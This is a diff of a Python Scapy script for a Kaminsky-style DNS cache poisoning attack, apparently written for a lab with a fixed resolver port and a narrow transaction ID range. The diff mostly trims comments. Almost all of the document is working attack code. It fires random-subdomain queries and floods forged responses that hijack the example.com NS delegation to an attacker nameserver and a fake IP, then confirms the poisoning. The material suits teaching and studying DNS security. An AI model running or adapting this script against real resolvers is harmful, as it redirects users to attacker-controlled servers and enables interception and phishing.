@@ -1,17 +1,14 @@
 #!/usr/bin/python3
 """
-kaminsky_poisoning.py - Kaminsky-style DNS cache poisoning demo.
-
 Attack overview (Kaminsky 2008):
   The classic cache poisoning difficulty is that you must guess both the
   Transaction ID (TXID) and the source port, and you only get one attempt
   per domain before the answer is cached and the query is never re-issued.
 
-  Kaminsky's insight: instead of targeting the fixed domain (www.example.com),
-  repeatedly query *random sub-labels* (e.g. abc123.example.com).  Because
-  these are non-existent, the resolver queries the authoritative server fresh
-  each time - giving the attacker infinite retries.  Each attempt floods forged
-  responses across the entire TXID space.
+  Kaminsky's insight: instead of targeting the fixed domain, repeatedly query random sub-labels.  
+  Because these are non-existent, the resolver queries the authoritative server fresh each time 
+  - giving the attacker infinite retries.  
+  Each attempt floods forged responses across the entire TXID space.
 
   The forged response includes an AUTHORITY section that redirects the resolver
   to a malicious NS for example.com, and an ADDITIONAL section that glues the
@@ -21,14 +18,11 @@ Attack overview (Kaminsky 2008):
   www.example.com are served from our attacker IP.
 
   This lab simplifies the attack by:
-    1. Fixing the resolver source port at 33333 (no source-port guessing needed)
-    2. Limiting the TXID range to [10000, 10005] (only 6 values to brute-force)
+    1. Fixing the resolver source port at 33333
+    2. Limiting the TXID range to [10000, 10005]
 
-Run inside the attacker container:
-    python3 kaminsky_poisoning.py
-
-Verify from client:
-    dig @10.19.0.53 www.example.com +short   # should return 6.6.6.6
+We verify from the client:
+    dig @10.19.0.53 www.example.com +short   # and should return 6.6.6.6
 """
 
 from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
@@ -45,7 +39,7 @@ MALICIOUS_NS = "ns.attacker.example.com"
 TXID_MIN = 10000
 TXID_MAX = 10005
 MAX_ATTEMPTS = 30
-RESOLVER_FIXED_PORT = 33333          # Resolver always uses this source port upstream
+RESOLVER_FIXED_PORT = 33333 
 
 
 def random_label(length=8):
@@ -53,9 +47,6 @@ def random_label(length=8):
 
     Each iteration of the attack needs a *fresh* subdomain that the resolver
     has not yet cached, so it will issue a new upstream query we can race.
-
-    Input:  length - int, number of characters (default 8)
-    Output: str    - random lowercase alphanumeric string of given length
     """
     return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
 
@@ -66,9 +57,6 @@ def trigger_random_query(name):
     We fire-and-forget: the goal is purely to cause the resolver to issue an
     upstream query to the authoritative server (which we will race with forgeries).
     Waiting for a response would waste time inside the race window.
-
-    Input:  name - str, fully-qualified domain name (e.g. "abc123.example.com")
-    Output: None (sends one UDP DNS query to RESOLVER_IP)
     """
     pkt = (
         IP(dst=RESOLVER_IP)
@@ -97,22 +85,19 @@ def flood_spoofed_responses(victim_name):
     server entirely and return FAKE_IP.
 
     We send each packet set 4 times to improve odds over the tiny race window.
-
-    Input:  victim_name - str, the random subdomain used in this attempt
-    Output: None (sends forged DNS packets to RESOLVER_IP)
     """
-    # QUESTION section - mirrors what the resolver originally asked
+    # Mirrors what the resolver originally asked
     qd = DNSQR(qname=victim_name, qtype="A", qclass="IN")
 
-    # ANSWER section - a valid-looking A record for the random subdomain
+    # a valid-looking A record for the random subdomain
     # (gives the resolver a plausible reason to accept this response)
     an = DNSRR(rrname=victim_name, type="A", rclass="IN", ttl=60, rdata=FAKE_IP)
 
     # AUTHORITY section - redirects example.com NS to our malicious nameserver
-    # This is the core of the Kaminsky attack: poison the NS delegation
+    # This is the core of the Kaminsky attack: which is poisoning the NS delegation
     ns = DNSRR(rrname=TARGET_ZONE, type="NS", rclass="IN", ttl=86400, rdata=MALICIOUS_NS)
 
-    # ADDITIONAL section (glue) - two records:
+    # An ADDITIONAL section (glue) - two records:
     #   1. A record for MALICIOUS_NS so the resolver knows where to reach it
     ar_ns = DNSRR(rrname=MALICIOUS_NS, type="A", rclass="IN", ttl=86400, rdata=FAKE_IP)
 
@@ -127,8 +112,8 @@ def flood_spoofed_responses(victim_name):
             / UDP(sport=53, dport=RESOLVER_FIXED_PORT)
             / DNS(
                 id=txid,
-                qr=1,       # This is a response
-                aa=1,       # Claim authoritative
+                qr=1, 
+                aa=1, 
                 rd=1,
                 ra=1,
                 qd=qd,
@@ -140,8 +125,6 @@ def flood_spoofed_responses(victim_name):
                 ar=ar_ns / ar_www,  # Chain both additional records
             )
         )
-
-    # Send the full packet set 4 times to widen the race window
     for _ in range(4):
         send(packets, verbose=0)
 
@@ -151,11 +134,6 @@ def check_poisoned():
 
     Sends a standard recursive A query and inspects the first answer record.
     If the returned IP matches FAKE_IP, the poisoning succeeded.
-
-    Input:  None
-    Output: tuple (bool, str|None)
-              - bool:     True if resolved IP equals FAKE_IP
-              - str|None: the IP address returned, or None if no answer
     """
     resp = sr1(
         IP(dst=RESOLVER_IP)
@@ -181,13 +159,13 @@ def check_poisoned():
 
 
 if __name__ == "__main__":
-    print("[*] Kaminsky demo started")
-    print(f"[*] Resolver TXID range assumed: [{TXID_MIN}, {TXID_MAX}]")
+    print("Kaminsky demo started")
+    print(f"Resolver TXID range assumed: [{TXID_MIN}, {TXID_MAX}]")
 
     for attempt in range(1, MAX_ATTEMPTS + 1):
         # Use a fresh random subdomain so the resolver always issues a new upstream query
         victim = f"{random_label()}.{TARGET_ZONE}"
-        print(f"[*] Attempt {attempt}/{MAX_ATTEMPTS}: {victim}")
+        print(f" Attempt {attempt}/{MAX_ATTEMPTS}: {victim}")
 
         # Step 1: trigger the resolver to issue an upstream query we can race
         trigger_random_query(victim)
@@ -198,9 +176,9 @@ if __name__ == "__main__":
         # Step 3: check whether TARGET_NAME is now cached with FAKE_IP
         ok, observed = check_poisoned()
         if ok:
-            print(f"[+] SUCCESS: {TARGET_NAME} -> {observed}")
+            print(f"SUCCESS: {TARGET_NAME} -> {observed}")
             break
-        print(f"[-] Not poisoned yet (observed: {observed})")
+        print(f"Not poisoned yet (observed: {observed})")
         time.sleep(0.1)
     else:
-        print("[!] Failed to poison cache within attempts")
+        print("Failed to poison cache within attempts")
